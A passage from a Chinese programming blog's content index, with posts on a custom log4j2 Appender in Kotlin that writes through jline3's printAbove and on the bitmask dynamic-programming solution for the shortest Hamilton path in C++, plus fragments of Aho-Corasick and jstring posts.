class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>]))]),</span><br><span class="line">    input_symbols=inputS,</span><br><span class="line">    transitions=t,</span><br><span class="line">    initial_state=<span class="string">&quot;q0&quot;</span>,</span><br><span class="line">    final_states=<span class="built_in">set</span>([<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> a[<span class="number">2</span>]])</span><br><span class="line">)</span><br><span class="line">nfa.show_diagram(view=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里用nfa而不是dfa是因为dfa画起来线太多很乱, 因为每个点有26根可能的线, 所以就把失配位置用<code>fail</code>线指向</p><h3 id="4-3-效果"><a href="#4-3-效果" class="headerlink" title="4.3 效果"></a>4.3 效果</h3><p><img src="/images/aho-corasick-automaton-(AC%E8%87%AA%E5%8A%A8%E6%9C%BA)%E7%9A%84%E7%90%86%E8%A7%A3.md-0.png" alt="nfa"></p><center>end</center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> Aho-corasick </tag>
            
            <tag> Trie-tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlin重定向log4j2的输出到jline3</title>
      <link href="/2021/11/19/kotlin%E9%87%8D%E5%AE%9A%E5%90%91log4j2%E7%9A%84%E8%BE%93%E5%87%BA%E5%88%B0jline3/"/>
      <url>/2021/11/19/kotlin%E9%87%8D%E5%AE%9A%E5%90%91log4j2%E7%9A%84%E8%BE%93%E5%87%BA%E5%88%B0jline3/</url>
      
        <content type="html"><![CDATA[<h2 id="1-实现思路"><a href="#1-实现思路" class="headerlink" title="1. 实现思路"></a>1. 实现思路</h2><p>遇到同时要用<code>log4j2</code>和<code>jline3</code>的情况, 如果把<code>log4j2</code>直接重定向到System.out会中断jline3的输入栏，必须要找方法用<code>lineReader.printAbove()</code>才可以避免</p><p>解决方法就是通过自定义<code>Appender</code>, 实现这个只需要在写一个<code>Appender</code>类然后在<code>log4j2.xml</code>里指明就好了</p><h2 id="2-Console类"><a href="#2-Console类" class="headerlink" title="2. Console类"></a>2. Console类</h2><p>首先先实现Jline3, 这个不是本文重点，就大概写下要提供什么<br>要提供<code>lineReader</code>主要是用到里面的<code>printAbove</code>方法(输出就不会打断下面的输入栏)</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> Console&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> terminal: Terminal = <span class="comment">/*complie code*/</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">val</span> lineReader: LineReader <span class="keyword">by</span> lazy &#123;</span><br><span class="line">        LineReaderBuilder.builder().terminal(terminal).completer(NullCompleter()).build()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Appender类"><a href="#3-Appender类" class="headerlink" title="3. Appender类"></a>3. Appender类</h2><p>模板来着于<a href="https://stackoverflow.com/a/24220688/14646226">Remko Popma的stackoverflow回答</a></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tech.eritquearcus.xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.AbstractLifeCycle</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.Filter</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.Layout</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.LogEvent</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.appender.AbstractAppender</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.Plugin</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.PluginAttribute</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.PluginElement</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.PluginFactory</span><br><span class="line"><span class="keyword">import</span> org.fusesource.jansi.Ansi</span><br><span class="line"><span class="comment">// 这个可能要手动import, 不然可能会报错Serializable是kotlin.io internal object</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类名可以改，不用和name一样, name也可以改, 大概照抄下就行, 主要是append方法</span></span><br><span class="line"><span class="meta">@Plugin(name = <span class="string">&quot;Jline3Appender&quot;</span>, category = <span class="string">&quot;Core&quot;</span>, elementType = <span class="string">&quot;appender&quot;</span>, printObject = true)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Jline3AppenderImpl</span> <span class="keyword">protected</span> <span class="keyword">constructor</span>(</span><br><span class="line">    name: String, filter: Filter?,</span><br><span class="line">    layout: Layout&lt;Serializable&gt;, ignoreExceptions: <span class="built_in">Boolean</span></span><br><span class="line">) : AbstractAppender(name, filter, layout, ignoreExceptions, <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">append</span><span class="params">(event: <span class="type">LogEvent</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// Console类在上面提供了, Ansi是色彩相关</span></span><br><span class="line">        Console.lineReader.printAbove(String(layout.toByteArray(event)) + Ansi().reset().toString())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line"><span class="comment">// 一定要这2个注释，不然可能会报错找不到Factory method</span></span><br><span class="line">        <span class="meta">@PluginFactory</span></span><br><span class="line">        <span class="meta">@JvmStatic</span> </span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">createAppender</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@PluginAttribute(<span class="string">&quot;name&quot;</span>)</span> name: <span class="type">String</span>?,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@PluginElement(<span class="string">&quot;Layout&quot;</span>)</span> layout: <span class="type">Layout</span>&lt;<span class="type">Serializable</span>&gt;,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@PluginElement(<span class="string">&quot;Filter&quot;</span>)</span> filter: <span class="type">Filter</span>?</span></span></span><br><span class="line"><span class="params"><span class="function">        )</span></span>: Jline3AppenderImpl? &#123;</span><br><span class="line">            <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">                AbstractLifeCycle.LOGGER.error(<span class="string">&quot;No name provided for MyCustomAppenderImpl&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Jline3AppenderImpl(name, filter, layout, <span class="literal">true</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-log4j2-xml"><a href="#4-log4j2-xml" class="headerlink" title="4. log4j2.xml"></a>4. log4j2.xml</h2><p>这个文件要放在<code>src/main/resource</code>下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;tech.eritquearcus.xxx.xxx.xxx&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Jline3Appender</span> <span class="attr">name</span>=<span class="string">&quot;jline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">pattern</span>=<span class="string">&quot;%highlight&#123;%d&#123;YYYY.MM.dd HH:mm:ss&#125; [%-5level] %logger&#123;36&#125; - %message&#125;&#123;FATAL=bg_red, ERROR=red, WARN=yellow, INFO=green&#125;\n&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">disableAnsi</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Jline3Appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;jline&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>主要就</p><ul><li>在<code>Configuration</code>写你的appender类所在的package</li><li><code>Jline3Appender</code>这个是你的Appender类上面的<code>@plugin</code>注释里的<code>name</code>属性</li><li><code>Jline3Appender</code>后面的name可以随便写，在下面的<code>Loggers</code>里的<code>AppenderRef</code>的<code>ref</code>写一样的就行</li><li><code>PatternLayout</code> 里的 <code>disableAnsi=&quot;false&quot;</code>是显示颜色</li><li><code>PatternLayout</code>里其他详细配置看其他的文章，这里就不写了</li></ul><center>end</center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对使用状态压缩和动态规划求hamilton最短路径的理解</title>
      <link href="/2021/06/20/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2021/06/20/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="hamilton问题"><a href="#hamilton问题" class="headerlink" title="hamilton问题"></a>hamilton问题</h2><p>即:</p><blockquote><p>给定一张 n(n≤20) 个点的带权无向图，点从 0~n-1 标号，求起点 0 到终点 n-1 的最短Hamilton路径。 Hamilton路径的定义是从 0 到 n-1 不重不漏地经过每个点恰好一次。<br>通俗来说就是，图表示大概为这个样子<br><img src="/images/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3.md-0.png" alt="来源:home.ustc.edu.cn/~xxxujian/homework8.pdf"></p></blockquote><p>本文中，代码里的^ 代表xor, 文本中的^ 代表次方</p><h2 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h2><p>本文主要解释通过状态压缩和动态规划优化后的枚举求最短路径算法，本质上还是枚举算法</p><h3 id="预设操作二进制的一些小算法"><a href="#预设操作二进制的一些小算法" class="headerlink" title="预设操作二进制的一些小算法"></a>预设操作二进制的一些小算法</h3><ul><li><code>(n&gt;&gt;k)&amp;1</code> 取出n在二进制状态中第k位的值(即把n右移k位，用与1按位与取出右移后数字的第0位也就是原数的第k位)，在本例中即为取是否经过第k个点</li><li><code>n^(1&lt;&lt;k)</code> 给n在二进制状态中的第k位取反，在本例中即代表如果经过那个点之前的情况</li></ul><h3 id="状态压缩"><a href="#状态压缩" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>本算法中，状态压缩主要体现在用一个int变量代替bool数组来优化时空占用<br>因为一个bool在C++中占1byte，而一个int变量在C++占4bytes (来源: <a href="https://docs.microsoft.com/zh-tw/cpp/cpp/fundamental-types-cpp?view=msvc-160#sizes-of-built-in-types">https://docs.microsoft.com/zh-tw/cpp/cpp/fundamental-types-cpp?view=msvc-160#sizes-of-built-in-types</a>)<br>所以当bool数组中数量超过4个时使用int类型代替必会节省空间，而本例中最多有20个需要表示的状态(状态指经过该点或没经过，n &lt;&#x3D; 20), 所以最多int变量需要有20为，也就是2^20(1&lt;&lt;20的值)，为1,048,576，而int最大为2147483647, 所以在本例适用.<br>所以在代表每个节点的状态的int中，二进制状态的第x位的值即代表是否经过第x点</p><h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><p>动态规划在本例中就是把寻找最短路径分割成很多个小任务，比如找到起点到第一个节点的的最短距离，然后找到第一个节点到第二个节点的最短距离，再把这两个相加就得出了起点到第二个节点的最短距离，从而推到终点算出起点到终点的最短距离。<br>所以就需要一个int数字来储存最短距离数据<br>本例算法中以f为变量名，大小为(2 ^ 20)*20，为什么是2 ^ 20是因为以一个最大为2^20的数表示当前经过了哪些点即有2 ^ 20种行进方法，而有20列是代表在当前状态(前面的数表示的经过状态)下，到每个点的最短距离.<br>比如: f[12][4] 就代表从起点经过第2第3个点后(12的二进制是1100)到第4个点的最短距离<br>在下面给出的代码中空出了f[0]中任意内容是因为是没有意义的，起点即为第0位，无论什么情况都要经过起点，也就是表达状态的数字无论什么情况都要大于1</p><h3 id="预设"><a href="#预设" class="headerlink" title="预设"></a>预设</h3><p>本例中把无穷大(也就是动态规划里每个最短路径的初始值)设置成<strong>0x3F及以上</strong>(和0x7F一样达到了10^9量级)基本数据在本例中不会达到这种量级，而且无穷大和无穷大相加还是等于无穷大，无穷大和其他数相加也是等于无穷大，并且也不会造成数据溢出。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入为一个n*n二维数组，第[i, j]项，也就是二维数组中第i行，第j列的数值表示i到j的权重(也可以理解为距离吧)，在下面用<code>weight</code>作为变量名，大概输入长这样：<br><img src="/images/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3.md-0.png" alt="来源: home.ustc.edu.cn/~xxxujian/homework8.pdf"><br>每个值代表该行到该列的点的权重(在本例中也可以理解成距离)或该列到该行的距离，如果不可以直接到达即为无穷</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>为int</p><h3 id="算法代码"><a href="#算法代码" class="headerlink" title="算法代码"></a>算法代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[<span class="number">1</span>&lt;&lt;<span class="number">20</span>][<span class="number">20</span>]; <span class="comment">//创建一个2^20*20的数组储存最短距离数据</span></span><br><span class="line"><span class="comment">// n为有几个点, weight为带权无向图的权重</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hamilton</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> weight[<span class="number">20</span>][<span class="number">20</span>])</span></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(f)); <span class="comment">// 初始化f每一项为无穷大</span></span><br><span class="line">f[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// 设置最开始的最短距离，即起点(因为第一个下标的1在二进制下第0位是1也就是代表经过第0点即起点的情况下)到起点(第二个下标是0即第0点)的距离为0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i ++)&#123;</span><br><span class="line"><span class="comment">// 循环每种情况，即从0...1循环到1...1也就是从只经过起点的情况循环到经过全部点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line"><span class="comment">// 循环每个点</span></span><br><span class="line"><span class="keyword">if</span>((i &gt;&gt; j) &amp; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">// 如果在i也就是表达状态的int中的第j位为1，也就是之前经过过j点,即找出可能为这一次经过的点(经过哪个点由外层循环的+1控制),是否为真正经过的点不用管,就枚举每一种路径可能性，是否真正可能由weight决定</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line"><span class="comment">// 循环每个点</span></span><br><span class="line"><span class="keyword">if</span>((i^ (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">// 如果之前经过过k点，即得出所有可能是上一次经过的点，和前面一样也不用管是否为那个点</span></span><br><span class="line">f[i][j] = <span class="built_in">min</span>(f[i][j], f[i^(<span class="number">1</span>&lt;&lt;j)][k] + weight[k][j]);</span><br><span class="line"><span class="comment">// f[i][j]的公式，代表在i情况下，从起点到j点的最短路径，其中[i, j]是唯一的，所以min中的f[i][j]相当于无穷(0x3F)。所以公式相当于就是在当前i情况下，如果不经过j点，起点到k点的最短路径 + j点到k点的最短路径(即权重，如果j无法直接到k即为无穷0x3F)和无穷相比取小的</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回在经过全部点(点是0 ~ n-1)的情况下去n - 1点(终点)的最短路径</span></span><br><span class="line"><span class="keyword">return</span> f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出路径"><a href="#输出路径" class="headerlink" title="输出路径"></a>输出路径</h3><p>在损失一些性能的情况下可以记录并输出路径</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">  <span class="type">int</span> weight = <span class="number">0x3F</span>;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">&#125;;</span><br><span class="line">Point f[<span class="number">1</span>&lt;&lt;<span class="number">20</span>][<span class="number">20</span>]; <span class="comment">//创建一个2^20*20的数组储存最短距离数据</span></span><br><span class="line"><span class="comment">// n为有几个点, weight为带权无向图的权重</span></span><br><span class="line"><span class="function">Point <span class="title">hamilton</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> weight[<span class="number">20</span>][<span class="number">20</span>])</span></span>&#123;</span><br><span class="line">  <span class="comment">// memset(f, 0x3f, sizeof(f)); // 初始化f每一项为无穷大</span></span><br><span class="line">  f[<span class="number">1</span>][<span class="number">0</span>].weight = <span class="number">0</span>; <span class="comment">// 设置最开始的最短距离，即起点(因为第一个下标的1在二进制下第0位是1也就是代表经过第0点即起点的情况下)到起点(第二个下标是0即第0点)的距离为0</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i ++)&#123;</span><br><span class="line">    <span class="comment">// 循环每种情况，即从0...1循环到1...1也就是从只经过起点的情况循环到经过全部点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">      <span class="comment">// 循环每个点</span></span><br><span class="line">      <span class="keyword">if</span>((i &gt;&gt; j) &amp; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// 如果在i也就是表达状态的int中的第j位为1，也就是之前经过过j点,即找出可能为这一次经过的点(经过哪个点由外层循环的+1控制),是否为真正经过的点不用管,就枚举每一种路径可能性，是否真正可能由weight决定</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line">          <span class="comment">// 循环每个点</span></span><br><span class="line">          <span class="keyword">if</span>((i^ (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果之前经过过k点，即得出所有可能是上一次经过的点，和前面一样也不用管是否为那个点</span></span><br><span class="line">            <span class="keyword">if</span>(f[i][j].weight &gt; f[i^(<span class="number">1</span>&lt;&lt;j)][k].weight + weight[k][j])&#123;</span><br><span class="line">              f[i][j].weight = f[i^(<span class="number">1</span>&lt;&lt;j)][k].weight + weight[k][j];</span><br><span class="line">              f[i][j].path = f[i^(<span class="number">1</span>&lt;&lt;j)][k].path;</span><br><span class="line">              f[i][j].path.<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// f[i][j]的公式，代表在i情况下，从起点到j点的最短路径，其中[i, j]是唯一的，所以min中的f[i][j]相当于无穷(0x3F)。所以公式相当于就是在当前i情况下，如果不经过j点，起点到k点的最短路径 + j点到k点的最短路径(即权重，如果j无法直接到k即为无穷0x3F)和无穷相比取小的</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回在经过全部点(点是0 ~ n-1)的情况下去n - 1点(终点)的最短路径</span></span><br><span class="line">  <span class="keyword">return</span> f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> input[<span class="number">20</span>][<span class="number">20</span>]&#123;</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">4</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">5</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">9</span>, <span class="number">0x3f</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0x3f</span>, <span class="number">2</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">2</span>, <span class="number">0x3f</span>, <span class="number">6</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">6</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">auto</span> p = <span class="built_in">hamilton</span>(<span class="number">8</span>, input);</span><br><span class="line">  cout &lt;&lt; p.weight &lt;&lt;endl;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> a : p.path)</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>文中图片来自于<a href="http://home.ustc.edu.cn/~xxxujian/homework8.pdf">http://home.ustc.edu.cn/~xxxujian/homework8.pdf</a><br>代码来自于 <em>算法竞赛进阶指南 &#x2F; 李煜东</em></p></blockquote><center> -END-</center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ jstring to string (UTF16-＞UTF8)</title>
      <link href="/2021/06/11/C++-jstring-to-string-(UTF16-%EF%BC%9EUTF8)/"/>
      <url>/2021/06/11/C++-jstring-to-string-(UTF16-%EF%BC%9EUTF8)/</url>
      
